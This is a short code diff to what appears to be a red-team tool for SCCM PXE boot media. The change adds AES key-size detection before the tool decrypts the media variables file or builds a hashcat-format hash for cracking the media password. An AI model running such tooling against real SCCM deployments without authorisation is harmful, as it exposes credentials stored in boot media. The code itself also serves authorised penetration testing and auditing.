@@ -39,6 +39,8 @@ if args.mode == "decrypt":
         with open(args.file, "rb") as f:
             filedata = f.read()
         print(f"[*] File size: {len(filedata)} bytes")
+        aes_bits = sccm_client.detect_encryption_type(filedata)
+        print(f"[*] Encryption: AES-{aes_bits}" if aes_bits else "[!] Unknown encryption type in header")
         key_bytes = bytes.fromhex(args.key)
         print(f"[*] Key ({len(key_bytes)} bytes): {key_bytes.hex()}")
         decrypted = sccm_client.decrypt_media_file(filedata, key_bytes)
@@ -89,7 +91,10 @@ if data_variables is None:
 if cryptokey is None:
     # Password IS set — no crypto key in DHCP response, need to crack the hash
     print("[*] PXE media is password-protected (no crypto key in DHCP response)")
-    hashcat_hash = f"$sccm$aes128${sccm_client.read_media_variable_file_header(data_variables).hex()}"
+    aes_bits = sccm_client.detect_encryption_type(data_variables)
+    aes_label = f"aes{aes_bits}" if aes_bits else "aes128"
+    print(f"[*] Detected encryption: AES-{aes_bits or 128}")
+    hashcat_hash = f"$sccm${aes_label}${sccm_client.read_media_variable_file_header(data_variables).hex()}"
 
     if args.password:
         print("[*] Decrypting media file with supplied password...")
